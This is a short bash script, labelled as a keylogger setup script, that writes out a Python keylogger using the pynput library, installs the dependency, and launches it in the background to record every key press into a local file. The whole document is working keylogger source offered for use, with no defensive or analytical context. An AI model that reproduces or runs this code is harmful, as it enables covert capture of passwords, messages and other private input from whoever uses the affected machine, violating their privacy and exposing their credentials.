#!/bin/bash

# keylogger.sh - Keylogger setup script

# Function to create and run a Python keylogger
create_keylogger() {
    echo "Creating keylogger script..."
    cat <<EOF > keylogger.py
from pynput.keyboard import Listener

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\\n")

with Listener(on_press=on_press) as listener:
    listener.join()
EOF
    echo "Installing pynput..."
    pip3 install pynput
    echo "Running keylogger..."
    python3 keylogger.py &
}

create_keylogger
